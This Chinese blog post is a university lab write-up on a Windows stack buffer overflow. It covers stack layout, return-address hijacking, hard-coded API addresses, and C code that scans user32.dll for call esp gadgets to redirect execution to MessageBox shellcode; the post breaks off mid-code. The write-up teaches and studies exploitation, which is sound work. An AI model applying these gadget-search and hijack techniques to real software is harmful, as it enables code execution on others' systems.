        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-02-01 02:00:18" itemprop="dateCreated datePublished" datetime="2024-02-01T02:00:18+08:00">2024-02-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-02-07 18:08:02" itemprop="dateModified" datetime="2024-02-07T18:08:02+08:00">2024-02-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="实训1-项目名称：-缓冲区溢出利用"><a href="#实训1-项目名称：-缓冲区溢出利用" class="headerlink" title="实训1 项目名称：   缓冲区溢出利用"></a>实训1 项目名称：   缓冲区溢出利用</h2><h3 id="一、环境及工具"><a href="#一、环境及工具" class="headerlink" title="一、环境及工具"></a>一、环境及工具</h3><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><ul>
<li>实验环境：Windows操作系统，使用Dev-C++ 5.11进行编译</li>
<li>设备：个人计算机</li>
<li>前置知识：C/C++编程基础，汇编语言基础，操作系统原理，网络安全基础</li>
<li>必要的课程：计算机安全，网络安全</li>
<li>说明：本实验旨在通过实践操作，深入理解缓冲区溢出的原理和利用方法，掌握编写和执行shellcode的基本技能。</li>
<li>推荐的文章链接：(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/15952483.html">缓冲区溢出漏洞的原理及其利用实战 - 浅易深 - 博客园 (cnblogs.com)</a>)</li>
</ul>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ul>
<li><p><strong>C/C++编程基础</strong>：理解数组、指针、字符串处理函数（如strcpy）的使用，以及函数调用过程中栈帧的变化。</p>
</li>
<li><p><strong>操作系统原理</strong>：了解进程和线程的基本概念，以及内存管理中的堆、栈、代码区和数据区。</p>
</li>
<li><p><strong>汇编语言基础</strong>：能够阅读和理解简单的汇编代码，了解寄存器的作用和常见的汇编指令。</p>
</li>
<li><p><strong>调试工具的使用</strong>：熟悉使用OllyDbg、IDA Pro等调试工具来分析程序的执行过程和内存布局。</p>
</li>
<li><p><strong>安全编程概念</strong>：了解缓冲区溢出漏洞的成因，以及如何通过安全编程实践来预防这类漏洞。</p>
</li>
<li><p><strong>Windows API函数</strong>：对于Windows平台，需要了解如何使用MessageBoxA、ExitProcess等API函数。</p>
</li>
<li><p><strong>Shellcode编写</strong>：理解如何编写简单的shellcode来执行特定的系统调用，如弹出对话框。</p>
</li>
<li><p><strong>动态链接库（DLL）和函数地址获取</strong>：了解如何在程序中加载DLL并获取特定函数的地址。</p>
</li>
<li><p><strong>操作系统保护机制</strong>：了解现代操作系统中用于防御缓冲区溢出的机制，如数据执行保护（DEP）和地址空间布局随机化（ASLR）。</p>
</li>
<li><p>Linux，x86体系结构，x86汇编，C语言，gdb</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/PC-Assembly-Language.pdf">PC Assembly Language</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/gcc-x86-Assembly.pdf">gcc x86 Assembly Quick Reference</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/gdb-refcard.pdf">GDB Quick Reference</a></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><strong>缓冲区溢出（buffer overflow）</strong>：在计算机安全和程序设计中的一种异常，当一个程序向缓冲区写入数据时，超出了缓冲区边界并且覆盖了相邻内存。</li>
<li><p><strong>调用栈（call stack）</strong>：用于存储程序中运行子例程信息的栈数据结构，先入后出。</p>
</li>
<li><p><strong>栈缓冲区溢出（stack buffer overflow）</strong>：程序向调用栈中原本缓冲区之外的内存地址写入数据，意图获取对指令指针的控制，将其指向恶意代码。</p>
</li>
</ul>
<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><ol>
<li><strong>环境搭建</strong>：确保操作系统和编译器已正确安装，调试工具OllyDbg和IDA Pro已配置好。</li>
<li><strong>知识复习</strong>：回顾C/C++编程基础，特别是数组和指针的使用，以及操作系统中堆栈的工作原理。</li>
<li><strong>实验目的</strong>：明确实验的目标是理解和掌握缓冲区溢出攻击的原理和方法。</li>
<li><strong>实验内容</strong>：详细阅读实验指导书，了解实验步骤和预期结果。</li>
<li><strong>参考资料</strong>：查阅相关文献和网络资源，如<a target="_blank" rel="noopener" href="https://www.sojson.com/ascii.html">缓冲区溢出利用实验遇到的几个问题</a>，为实验提供理论支持。</li>
</ol>
<h4 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h4><p>缓冲区溢出是一种常见的软件安全漏洞，它发生在程序处理输入数据时，没有正确检查数据的长度，导致数据超出了分配给该数据的内存空间，从而覆盖了相邻的内存区域。这种溢出可以破坏程序的正常执行流程，甚至允许攻击者执行任意代码。在实验中，我们将通过编写一个存在缓冲区溢出漏洞的程序，然后利用这个漏洞来执行我们控制的代码，例如弹出一个警告对话框。</p>
<p>缓冲区溢出漏洞的实验原理基于程序在处理输入数据时的缺陷。在C/C++程序中，如果使用如strcpy这样的函数来复制字符串到一个固定大小的缓冲区，而没有检查字符串的长度，那么当输入的字符串超过缓冲区的大小时，多余的数据就会溢出到相邻的内存区域。这个相邻的内存区域可能包含程序的返回地址，如果攻击者能够控制这个返回地址，就可以让程序执行攻击者指定的代码，这就是所谓的“控制流劫持”。</p>
<p>在实验中，我们会创建一个简单的程序，该程序包含一个易受攻击的函数，该函数会接收用户输入并将其复制到一个固定大小的缓冲区。然后，我们会构造一个特殊的输入字符串，使其长度超过缓冲区的大小，从而触发溢出。通过精心构造这个字符串，我们可以覆盖返回地址，使其指向我们准备的shellcode。当程序执行到返回指令时，它会跳转到shellcode的地址，执行我们注入的代码。</p>
<p>通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，进而运行精心准备的指令，以达到攻击的目的。  </p>
<p><img src="https://pic3.zhimg.com/v2-1b6a999604597d4bdc536eb59c2955aa_b.jpg" alt=""></p>
<p>如上图，程序的缓冲区比作一个个格子（内存单元），每个格子中存放不同的东西，有的是命令，有的是数据，当程序需要接收用户数据，程序预先为之分配了4个格子（上图中黄色的0~3号格子）。</p>
<p>按照程序设计，就是要求用户输入的数据不超过4个。</p>
<p>而用户在输入数据时，假设输入了16个数据，而且程序也没有对用户输入数据的多少进行检查（这种情况太常见了，windows系统本身就出过n个缓冲区溢出漏洞），就往预先分配的格子中存放，这样不仅4个分配的格子(内存)被使用了，其后相邻的12个格子中的内容都被新数据覆盖。  </p>
<p>一般情况下后面的格子是可以被当成代码执行的，嘿嘿，那么好玩的事情来了，我们可以精心制造一段指令，比如格式化硬盘指令来让cpu执行。</p>
<p><img src="https://pic4.zhimg.com/v2-48df59365aad345eb680d0da0cc56ab3_b.jpg" alt=""></p>
<p>堆栈溢出是如何形成的？</p>
<p>简单来说，堆栈溢出就是把大缓冲区中的数据向小缓冲区中复制，由于没有关注小缓冲区的边界，“撑爆”了较小的缓冲区，从而冲掉了小缓冲区和邻内区域的其他数据而引起的内存问题。在具体描述堆栈溢出之前我们先来了解一下 Linux 程序在内存中的结构：</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/ae79ff8733b58380a78d8db1ff1c610d68380b0d77a9b6ad2591635514a85fa0/687474703a2f2f6d6d62697a2e717069632e636e2f6d6d62697a5f706e672f573944714b67467363363851674637706759475848647a6e33574468736730317a70316b6962335a384c6d55686d7951534a556f45717742556a376e61465a3971764c6268724c6e4a6d54384776416144366461716963412f303f77785f666d743d706e67"><img src="https://camo.githubusercontent.com/ae79ff8733b58380a78d8db1ff1c610d68380b0d77a9b6ad2591635514a85fa0/687474703a2f2f6d6d62697a2e717069632e636e2f6d6d62697a5f706e672f573944714b67467363363851674637706759475848647a6e33574468736730317a70316b6962335a384c6d55686d7951534a556f45717742556a376e61465a3971764c6268724c6e4a6d54384776416144366461716963412f303f77785f666d743d706e67" alt="img"></a></p>
<p>其中共享区也称为 data 区，用来存储可执行代码；.text 和 .bss 均用来存储程序的全局变量和初始化变量；堆则不随函数消亡而消亡，而是直到程序消亡或手动释放才会消亡；堆栈是随着函数分配并消亡的，堆栈溢出就是出现在堆栈区中的缓冲区安全问题。 </p>
<p>堆栈是一个后进先出（LIFO）数据结构，往低地址增长，它保存本地变量、函数调用等信息。随着函数调用层数的增加，栈帧会向低地址方向延伸；随着进程中函数调用层数的减少，即各函数的返回，栈帧会一块一块地被遗弃而向内存的高地址方向回缩。各函数的栈帧大小随着函数的性质不同而不等。 </p>
<p>堆栈这种数据结构，常见操作有压栈（PUSH）、弹栈（POP）；用于标识栈的属性有：栈顶（TOP）、栈底（BASE）。 </p>
<p>其中：</p>
<p>◈ PUSH：为栈增加一个元素的操作叫做 PUSH，相当于插入一块；</p>
<p>◈ POP：从栈中取出一个元素的操作叫做 POP；</p>
<p>◈ TOP：TOP 标识栈顶的位置，且是动态变化的，每做一次 PUSH 操作，它会自 +1；每做一次 POP 操作，它会自 -1；</p>
<p>◈ BASE：BASE 标识栈底位置，用于防止栈空后继续弹栈，一般来说BASE位置不发生改变。</p>
<p>下面以 main 函数叠加 A 和 B 函数为例说明整个压栈和弹栈过程：</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/f0fe40ae66ac2079c75a56c3cf3b854f7ccb560f47e5547108dd495b061b0658/687474703a2f2f6d6d62697a2e717069632e636e2f6d6d62697a5f6a70672f573944714b67467363363851674637706759475848647a6e33574468736730317a696343413356447a3036755545396463517469616748725359506a6254384e587a39394f696336427a5155644b476632354c7a6e53766f772f303f77785f666d743d6a706567"><img src="https://camo.githubusercontent.com/f0fe40ae66ac2079c75a56c3cf3b854f7ccb560f47e5547108dd495b061b0658/687474703a2f2f6d6d62697a2e717069632e636e2f6d6d62697a5f6a70672f573944714b67467363363851674637706759475848647a6e33574468736730317a696343413356447a3036755545396463517469616748725359506a6254384e587a39394f696336427a5155644b476632354c7a6e53766f772f303f77785f666d743d6a706567" alt="img"></a></p>
<p>Main 函数调用 A 函数，把 A 函数中的变量添加到堆栈区内，开辟大小和变量指定大小相关。同样 B 函数在被调用后也会把变量添加到堆栈区内，开辟指定大小空间给 B 区域变量使用。</p>
<p>◈如果其中任意一个变量存入的值超过设计的界定，就会导致值覆盖其他变量的区域最终污染到函数返回地址区域。一旦函数的返回地址被污染，在进行弹栈的过程中会最终把跳转的地址指向黑客所指定的区域，或根本不存在的区域。</p>
<p>◈如果覆盖函数返回地址的是一组随机值，则程序会跳转到未知位置，这种情况往往最终会导致整个程序崩溃。</p>
<p>◈如果黑客构造足够精细的 shellcode，把跳转地址指向黑客自己注入的代码，则很可能会利用该漏洞获得当前用户的控制权限。</p>
<h4 id="实验概述"><a href="#实验概述" class="headerlink" title="实验概述"></a>实验概述</h4><ul>
<li><strong>实验目的</strong>：通过模拟缓冲区溢出攻击，理解其原理，掌握利用方法。</li>
<li><strong>实验要求</strong>：编写程序实现缓冲区溢出，执行特定功能（如弹出MessageBox警告框）。</li>
<li><strong>实验原理</strong>：利用程序在处理输入时未正确检查缓冲区大小，导致数据溢出到相邻内存区域，覆盖关键数据（如返回地址），从而控制程序流程。</li>
</ul>
<h4 id="实验中可能出现的问题"><a href="#实验中可能出现的问题" class="headerlink" title="实验中可能出现的问题"></a>实验中可能出现的问题</h4><ol>
<li><p><strong>编译器优化</strong>：某些编译器可能会对代码进行优化，这可能会改变程序的内存布局，使得溢出攻击更加困难。例如，编译器可能会将局部变量移动到堆上，或者在编译时自动插入安全检查。</p>
</li>
<li><p><strong>栈保护机制</strong>：现代操作系统和编译器可能会启用栈保护机制，如StackGuard或ProPolice，这些机制会检测并阻止栈溢出。</p>
</li>
<li><p><strong>地址随机化</strong>：地址空间布局随机化（ASLR）会随机化程序和库在内存中的位置，使得预测shellcode的执行地址变得困难。</p>
</li>
<li><p><strong>数据执行保护</strong>：数据执行保护（DEP）会标记某些内存区域为不可执行，阻止攻击者执行注入的代码。</p>
</li>
<li><p><strong>调试器干扰</strong>：在调试过程中，调试器可能会改变程序的执行行为，例如通过断点或单步执行，这可能会影响溢出攻击的成功率。</p>
</li>
<li><p><strong>shellcode兼容性</strong>：编写的shellcode需要与目标系统的架构（如x86或x64）兼容，并且需要考虑到目标系统上的特定API函数地址。</p>
</li>
<li><p><strong>错误处理</strong>：程序可能会有错误处理逻辑，如异常处理，这可能会在溢出发生时执行，从而影响攻击的执行流程。</p>
</li>
<li><p><strong>环境差异</strong>：不同的操作系统版本、编译器版本和系统配置可能会导致实验结果不一致。</p>
</li>
</ol>
<p>为了成功完成实验，实验者需要对上述问题有所了解，并在实验设计中考虑到这些潜在的障碍。通过实验，实验者将能够更深入地理解缓冲区溢出的原理，并学会如何识别和利用这类漏洞。</p>
<h3 id="二、实训流程及分析"><a href="#二、实训流程及分析" class="headerlink" title="二、实训流程及分析"></a>二、实训流程及分析</h3><p><strong>关键步骤</strong></p>
<ol>
<li><strong>精确定位返回地址的位置</strong>：通过调试工具分析程序执行过程中的堆栈变化，确定函数返回地址在堆栈中的具体位置。</li>
<li><strong>寻找合适的地址覆盖原始地址</strong>：使用动态链接库（如user32.dll）中的跳转指令（如jmp esp）来找到一个合适的地址，以便将控制流引导到我们的shellcode。</li>
<li><strong>编写shellcode到相应的缓冲区中</strong>：编写shellcode并将其放置在合适的内存位置，以便在覆盖后的地址执行。</li>
</ol>
<p>特别说明：在本实训中，我们将攻击代码（即MessageBox弹窗警告）直接写在jmp esp或call esp地址后面。这是因为jmp esp指令会跳转到栈指针（ESP）指向的地址执行代码，而我们的shellcode正好位于这个位置。这种方法可以确保在栈溢出时，执行流被重定向到我们控制的代码区域。</p>
<p><strong>精确定位返回地址</strong></p>
<ol>
<li><p><strong>编译模式对比</strong>：首先，我们对比了不同编译模式下的栈空间分配。在debug模式下，编译器会为数组预留更多的空间，这可能会影响返回地址的定位。通过使用OllyDbg，我们观察了不同编译模式下返回地址的位置，以确保我们能够准确定位到目标地址。</p>
</li>
<li><p><strong>调试程序源码分析</strong>：我们编写了一个简单的调试程序，使用32bit-debug模式编译。通过观察程序执行后返回地址的内容，我们确定了返回地址的确切位置。</p>
</li>
<li><p><strong>ESP和EBP的入栈</strong>：在程序执行过程中，我们观察到ESP和EBP的值会入栈。这为我们提供了一个参考点，以便在后续步骤中确定正确的地址。</p>
</li>
</ol>
<p><strong>寻找合适的跳转地址</strong></p>
<ol>
<li><p><strong>jmp esp(call esp)的利用</strong>：我们利用了jmp esp(call esp)指令的特性，这种指令允许程序跳转到ESP寄存器指向的地址。通过搜索kernel32.dll，我们找到了一些call esp的地址，这些地址可以被用来实现跳转。</p>
</li>
<li><p><strong>user32.dll的加载</strong>：由于MessageBoxA函数需要user32.dll动态链接库，我们必须确保主程序加载了这个库。否则，MessageBoxA调用将失败。</p>
</li>
</ol>
<p><strong>编写shellcode并执行</strong></p>
<ol>
<li><p><strong>shellcode编写</strong>：我们编写了一个简单的shellcode，其目的是调用MessageBoxA函数来弹出警告框。这个shellcode需要被放置在程序的缓冲区中，以便在溢出时执行。</p>
</li>
<li><p><strong>攻击代码的放置</strong>：我们将shellcode直接写在jmp esp或者call esp地址后面，这样做的原因是，一旦jmp esp或call esp指令被执行，程序的控制流将跳转到ESP寄存器指向的地址，即我们的shellcode。这样，我们就可以控制程序执行我们想要的代码，而不是返回到原始的返回地址。</p>
</li>
<li><p><strong>程序执行</strong>：在程序执行过程中，我们通过溢出输入，覆盖了返回地址，使其指向我们的shellcode。当程序执行到返回指令时，它将跳转到shellcode，执行我们定义的操作（弹出MessageBoxA）。</p>
</li>
</ol>
<p><strong>遇到的问题</strong></p>
<ol>
<li><p><strong>编译器的嵌套堆栈保护</strong>：在某些编译器版本中，如Dev-C++ 5.11，存在嵌套堆栈的保护机制。这会使得溢出后无法直接返回到我们想要的地址。为了解决这个问题，我们采用了几种方法：预留出足够的空间来覆盖嵌套堆栈，直接在动态调试器中修改汇编指令，或者更换编译器版本。</p>
</li>
<li><p><strong>调试器报错</strong>：在使用Dev-C++ 5.11编译时，我们在“__try”处遇到了报错。这提示我们需要更换编译器，或者使用其他等价的函数来避免错误。</p>
</li>
<li><p><strong>动态链接库的加载问题</strong>：在未正确加载user32.dll的情况下，MessageBoxA调用会失败。这要求我们在编写shellcode之前确保所有必要的动态链接库都被正确加载。</p>
</li>
</ol>
<p>通过这些步骤和对问题的解决，我们成功地实现了缓冲区溢出攻击，并且弹出了MessageBoxA警告框。这个过程不仅加深了我们对缓冲区溢出原理的理解，也提高了我们在实际环境中识别和利用此类漏洞的能力。</p>
<p><strong>具体操作</strong></p>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141647865.png" class="" title="image-20240131141647865">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141659202.png" class="" title="image-20240131141659202">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141706938.png" class="" title="image-20240131141706938">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141713797.png" class="" title="image-20240131141713797">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141723487.png" class="" title="image-20240131141723487">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141733407.png" class="" title="image-20240131141733407">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141740142.png" class="" title="image-20240131141740142">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141752071.png" class="" title="image-20240131141752071">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141800874.png" class="" title="image-20240131141800874">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141808492.png" class="" title="image-20240131141808492">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141816283.png" class="" title="image-20240131141816283">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141825548.png" class="" title="image-20240131141825548">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141833223.png" class="" title="image-20240131141833223">
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141841368.png" class="" title="image-20240131141841368">
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user32=<span class="number">0x763f0000</span></span><br><span class="line">ExitProcess= <span class="number">0x764174d0</span>                                                                                 </span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141851414.png" class="" title="image-20240131141851414">
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user32=<span class="number">0x75880000</span>                                                                                         MessageBoxA= <span class="number">0x758fa110</span></span><br></pre></td></tr></table></figure>
<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141859074.png" class="" title="image-20240131141859074">
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE hHandle = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!hHandle)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BYTE* ptr =(BYTE*)hHandle;</span><br><span class="line">	<span class="type">int</span> address;</span><br><span class="line">	BOOL done_Flag=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;!done_Flag;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		__try</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (ptr[i] == <span class="number">0xFF</span> &amp;&amp; ptr[i + <span class="number">1</span>] == <span class="number">0xD4</span>)  <span class="comment">//jmp esp FFE4 ;  call esp FFD4</span></span><br><span class="line">				&#123;</span><br><span class="line">					address = (<span class="type">int</span>)ptr+i;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%x\n&quot;</span>,address);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">		__except (EXCEPTION_EXECUTE_HANDLER)&#123;&#125;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//	address = (int)ptr+i;</span></span><br><span class="line">			<span class="comment">//	printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span></span><br><span class="line">			<span class="comment">//	done_Flag=true;</span></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76077be7</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76078cad</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76078cb9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76079d7f</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607ad25</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607dea7</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607dffb</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7607e00b</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76080be5</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76080be9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76080ff9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x760812d1</span></span><br><span class="line"><span class="comment">OPCODE found at 0x760823a3</span></span><br><span class="line"><span class="comment">OPCODE found at 0x7608345d</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76083e2b</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76084523</span></span><br><span class="line"><span class="comment">OPCODE found at 0x76084ef9</span></span><br><span class="line"><span class="comment">OPCODE found at 0x760855e9</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">0</span>	<span class="number">-1</span>	In function <span class="string">&#x27;int main()&#x27;</span>:</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">18</span>	<span class="number">17</span>	[错误] <span class="string">&#x27;__try&#x27;</span> was <span class="keyword">not</span> declared in <span class="keyword">this</span> scope</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">28</span>	<span class="number">17</span>	[错误] <span class="string">&#x27;__except&#x27;</span> was <span class="keyword">not</span> declared in <span class="keyword">this</span> scope</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">12</span>	<span class="number">15</span>	[警告] unused variable <span class="string">&#x27;ptr&#x27;</span> [-Wunused-variable]</span><br><span class="line">D:/文件/大学/实训/缓冲区溢出/SearchJmpEsp.cpp	<span class="number">13</span>	<span class="number">13</span>	[警告] unused variable <span class="string">&#x27;address&#x27;</span> [-Wunused-variable]</span><br></pre></td></tr></table></figure>
<p>原程序遇到的编译错误和警告表明有几个问题需要解决：</p>
<ol>
<li><p><strong><code>__try</code> 和 <code>__except</code> 未声明</strong>：这些是 Microsoft 特有的结构化异常处理（SEH）关键字，仅在特定的编译器（如 MSVC）中可用。如果您在 DevC++ 或其他非 MSVC 编译器中编译此代码，这些关键字将不可用。</p>
</li>
<li><p><strong>未使用的变量</strong>：警告表明 <code>ptr</code> 和 <code>address</code> 变量被声明但未使用。这可能是因为代码中有逻辑错误或不完整的实现。</p>
</li>
</ol>
<p>要修复这些问题，我们可以做如下修改：</p>
<ul>
<li>替换 <code>__try</code> 和 <code>__except</code> 为标准的 C++ 异常处理，如果需要的话。但是，由于您的目的是扫描内存，可能不需要异常处理。</li>
<li>确保所有声明的变量都被正确使用。</li>
</ul>
<p>以下是修改后的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HINSTANCE hHandle = LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hHandle) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BYTE* ptr = (BYTE*)hHandle;</span><br><span class="line">    <span class="type">uintptr_t</span> address;  <span class="comment">// 使用 uintptr_t 以兼容 64 位系统</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uintptr_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000000</span>; i++) &#123; <span class="comment">// 假定扫描的最大范围</span></span><br><span class="line">        <span class="keyword">if</span> (ptr[i] == <span class="number">0xFF</span> &amp;&amp; ptr[i + <span class="number">1</span>] == <span class="number">0xD4</span>) &#123;</span><br><span class="line">            address = (<span class="type">uintptr_t</span>)ptr + i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%p\n&quot;</span>, (<span class="type">void</span>*)address);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    